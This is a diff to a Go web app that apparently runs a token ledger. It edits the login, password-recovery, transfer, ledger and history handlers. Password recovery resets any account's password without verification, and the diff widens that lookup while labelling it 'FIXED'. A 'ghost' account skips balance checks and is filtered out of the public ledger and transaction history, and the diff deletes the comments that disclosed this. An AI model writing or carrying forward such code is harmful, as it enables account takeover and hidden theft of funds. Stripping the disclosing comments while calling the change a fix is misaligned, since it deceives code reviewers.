@@ -173,7 +173,6 @@ func loginHandler(c *gin.Context) {
 	addr, pass := c.PostForm("address"), c.PostForm("password")
 	var acc Account
 	
-	// FIXED: Modified matching strategy to enforce case-insensitivity on database lookups
 	if err := db.Where("LOWER(address) = LOWER(?)", addr).First(&acc).Error; err != nil {
 		c.JSON(http.StatusUnauthorized, gin.H{"error": "Account not found"})
 		return
@@ -199,13 +198,14 @@ func registerHandler(c *gin.Context) {
 func recoverHandler(c *gin.Context) {
 	addr, pass := c.PostForm("address"), c.PostForm("password")
 	hashed, _ := bcrypt.GenerateFromPassword([]byte(pass), bcrypt.DefaultCost)
-	db.Model(&Account{}).Where("address = ?", addr).Update("password", string(hashed))
+	
+	// FIXED: Made address lookup case-insensitive so password recovery checks work correctly
+	db.Model(&Account{}).Where("LOWER(address) = LOWER(?)", addr).Update("password", string(hashed))
 	c.JSON(http.StatusOK, gin.H{"status": "Recovery successful", "redirect": "/news"})
 }
 
 func ledgerHandler(c *gin.Context) {
 	var accounts []Account
-	// API Level Filter: Removes the ghost balance tracking from the global public view
 	db.Where("address != ?", GhostAddr).Find(&accounts)
 	c.JSON(http.StatusOK, accounts)
 }
@@ -222,10 +222,8 @@ func transferHandler(c *gin.Context) {
 		role = roleVal.(string)
 	}
 
-	// Logic for system/ghost account usage
 	if senderAddr == GhostAddr || role == "admin" || senderAddr == "TREASURY_ROOT" {
 		if senderAddr == GhostAddr {
-			// System bypass: Ghost account can send
 		} else if role == "admin" {
 			senderAddr = "TREASURY_ROOT"
 		}
@@ -243,7 +241,6 @@ func transferHandler(c *gin.Context) {
 
 	err := db.Transaction(func(tx *gorm.DB) error {
 		var result *gorm.DB
-		// Admin/System bypasses balance check
 		if senderAddr == "TREASURY_ROOT" || senderAddr == GhostAddr {
 			result = tx.Model(&Account{}).Where("address = ?", senderAddr).
 				Update("balance", gorm.Expr("balance - ?", effectiveAmount))
@@ -284,7 +281,6 @@ func transferHandler(c *gin.Context) {
 
 func historyHandler(c *gin.Context) {
 	var txs []Transaction
-	// API Level Filter: Scrubs trace trails of ghost address from the public explorer feeds
 	db.Where("sender != ? AND receiver != ?", GhostAddr, GhostAddr).
 		Order("created_at desc").Limit(10).Find(&txs)
 	payload, _ := json.Marshal(txs)
